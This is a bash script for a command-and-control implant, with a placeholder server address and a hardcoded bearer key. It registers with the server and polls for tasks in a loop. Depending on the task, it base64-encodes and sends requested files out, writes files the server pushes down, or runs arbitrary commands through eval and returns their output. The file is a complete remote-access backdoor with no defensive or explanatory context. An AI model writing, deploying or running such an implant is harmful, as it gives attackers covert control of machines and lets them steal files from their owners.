#!/bin/bash

C2_SERVER_IP="http://C2-SERVER-IP:80"
AUTH="MySecretKey123"
POLL_INTERVAL=2

# Register agent
AGENT_ID=$(curl -s -X POST -H "Authorization: Bearer $AUTH" $C2_SERVER_IP/register | jq -r .agent_id)

while true; do
    TASK=$(curl -s -H "Authorization: Bearer $AUTH" $C2_SERVER_IP/task/$AGENT_ID | jq -r .task)

    if [ "$TASK" != "null" ] && [ -n "$TASK" ]; then

        # Check if TASK is JSON (starts with {)
        if [[ "$TASK" =~ ^\{ ]]; then
            TASK_TYPE=$(echo "$TASK" | jq -r '.type // empty')

            # GET (download file from agent)
            if [ "$TASK_TYPE" == "get" ]; then
                REMOTE_PATH=$(echo "$TASK" | jq -r '.path')
                if [ -f "$REMOTE_PATH" ]; then
                    B64=$(base64 "$REMOTE_PATH" | tr -d '\n')
                    FILENAME=$(basename "$REMOTE_PATH")
                    PAYLOAD="{\"type\":\"file\",\"filename\":\"$FILENAME\",\"data\":\"$B64\"}"
                    curl -s -X POST -H "Authorization: Bearer $AUTH" -H "Content-Type: application/json" -d "$PAYLOAD" $C2_SERVER_IP/result/$AGENT_ID
                else
                    curl -s -X POST -H "Authorization: Bearer $AUTH" -d "{\"type\":\"error\",\"result\":\"File not found: $REMOTE_PATH\"}" $C2_SERVER_IP/result/$AGENT_ID
                fi

            # PUT (upload file to agent)
            elif [ "$TASK_TYPE" == "put" ]; then
                FILENAME=$(echo "$TASK" | jq -r '.filename')
                B64=$(echo "$TASK" | jq -r '.data')
                echo "$B64" | base64 --decode > "$FILENAME"
                curl -s -X POST -H "Authorization: Bearer $AUTH" -d "{\"type\":\"info\",\"result\":\"Received file $FILENAME\"}" $C2_SERVER_IP/result/$AGENT_ID
            fi

        else
            # Normal shell command
            RESULT=$(eval "$TASK" 2>&1)
            # Escape quotes and send as plain text
            ESCAPED=$(echo "$RESULT" | sed 's/"/\\"/g')
            curl -s -X POST -H "Authorization: Bearer $AUTH" -H "Content-Type: application/json" --data-binary "$ESCAPED" $C2_SERVER_IP/result/$AGENT_ID
        fi
    fi

    sleep $POLL_INTERVAL
done
